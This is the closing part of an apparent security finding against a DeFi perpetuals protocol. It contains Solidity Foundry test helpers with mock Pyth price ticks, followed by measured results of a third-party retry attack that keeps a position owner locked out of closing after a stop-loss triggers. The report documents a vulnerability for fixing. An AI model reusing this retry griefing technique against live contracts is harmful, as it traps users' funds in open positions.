    function _closeRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("owner-close", vm.getBlockTimestamp()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = 0;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds = _bounds();
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _raisedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: MAX_EXECUTION_NOTIONAL,
            maxGrossAccountDebitAssets: 1500e6,
            maxActionChargeAssets: MAX_ACTION_CHARGE,
            maxExplicitFeesAssets: MAX_EXPLICIT_FEES
        });
    }

    function _executeAt(
        address keeper,
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory tick = _historicalTick(orderId, price);
        vm.prank(keeper);
        result = router.executeOrder(orderId, tick);
    }

    /// @dev Signed-update stand-in: one tick per feed, first after the order's commit time (Pyth mock only).
    function _historicalTick(
        uint64 orderId,
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        uint64 commitTime = router.lifecycleBook().orderTiming(orderId).commitTimestamp;
        uint256 publishTime = uint256(commitTime) + 1;
        if (vm.getBlockTimestamp() < publishTime) {
            vm.warp(publishTime);
        }
        _nextBlock();
        updateData = _ticks(price, publishTime, commitTime);
    }

    function _liveTick(
        uint256 price
    ) internal view returns (bytes[] memory) {
        return _ticks(price, vm.getBlockTimestamp(), engine.lastMarkTime());
    }

    function _ticks(
        uint256 price,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, previousPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        _nextBlock();
        router.updateMarkPrice(_liveTick(price));
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _assertConstraintFailure(
        OrderV3Types.ExecutionResult memory result,
        uint64 orderId
    ) internal {
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt did not fail");
        assertEq(
            uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "wrong failure"
        );
        OrderV3Types.CompactOutcome memory outcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), orderId);
        assertEq(
            uint8(outcome.failedConstraint),
            uint8(OrderV3Types.ConstraintKind.GrossAccountDebit),
            "the retained gross-debit ceiling did not reject the close"
        );
        assertEq(
            outcome.failureSelector,
            ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector,
            "unexpected failure selector"
        );
    }

    function _assertStatus(
        uint64 protectionId,
        PositionProtectionTypes.PositionProtectionStatus expected
    ) internal view {
        assertEq(uint8(bookViews.getPositionProtection(protectionId).status), uint8(expected), "protection status");
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

}
```

</details>

### Observed balances:

24-hour test (`--match-test Over24Hours --gas-limit 9223372036854775807`). The control branch and the attack branch start from the same state, right after the stop-loss triggers on the +1.00% tick.

| Measurement | Control: owner amends after the first rejection | Attack: third-party retry after every rejection | Difference caused by the retry |
| --- | ---: | ---: | ---: |
| Close debit if the first tick is the +0.50% stop (reference) | 490.299843 USDG | 490.299843 USDG | 0 |
| Retained gross-account-debit ceiling | 750.000000 USDG | 750.000000 USDG | 0 |
| Close debit at the +1.00% gap tick (rejected: `GrossAccountDebit`) | 990.499872 USDG | 990.499872 USDG | 0 |
| Attacker transactions | 0 | 1,418 | +1,418 |
| Attacker gas | 0 | 1,327,998,103 (936,528 per transaction) | +1,327,998,103 |
| Owner exit after the trigger | 4 s | 86,502 s | +86,498 s |
| Time all owner exit paths revert while the attacker cycles | 0 s | 86,439 s | +86,439 s |
| Position notional held open | — | 101,000.000000 USDG | — |
| Position margin locked during the lockout | — | 4,810.099787 USDG | — |
| Owner withdrawable settlement during the lockout | — | 14,999.600000 USDG | — |
| Owner settlement balance after the exit | 18,919.199915 USDG | 18,917.961043 USDG | −1.238872 USDG |

One-hour test (`--match-test OverOneHour`, default settings): 60 attacker transactions (56,421,860 gas, 940,364 per transaction). Every owner exit path reverts for 3,601 seconds, and the owner exits 3,664 seconds after the trigger, against 4 seconds in the control branch. The position margin locked during the lockout is again 4,810.099787 USDG.
